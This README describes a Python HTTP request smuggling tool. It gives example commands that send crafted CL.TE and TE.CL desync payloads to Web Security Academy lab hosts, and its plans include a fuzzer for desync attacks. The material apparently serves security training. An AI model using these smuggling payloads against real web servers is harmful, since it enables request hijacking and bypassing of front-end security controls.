# pyhttpsmuggler
Scripts related to web/request smuggling & general web hacking
## Examples

### CL.TE Vulnerability
python3 pysmuggle.py --host your-access-token.web-security-academy.net --method POST --body-length 35 --body-data ""  --smuggled-body-fields "GET /404 HTTP/1.1,X-Ignore: X" -- debug 1

### TE.CL Vulnerability
python3 pysmuggle.py --host your-access-token.web-security-academy.net --method POST --body-length 4 --body-data "5c" --smuggled-body-fields "GPOST / HTTP/1.1,Content-Type: application/x-www-form-urlencoded,Content-Length: 15,,x=1,0," --debug 1

## Changelog
### 9/2/2021
Implemented a WebRequest class to generate arbitrary web requests with malformed fields and/or fuzz around for TE.CL and CL.TE vulnerabilities in web server configurations.

# Todo:
## pyhttpsuggler-cli
### 1
Improve  CLI for sending arbitrary requests from the command line rather than using driver scripts like smuggle.py. Maybe I will implement this in C++ or scapy depending on the advantages each choice offers...
### 2
Add fuzzing engine script to automate fuzzing websites for various HTTP request desync attacks
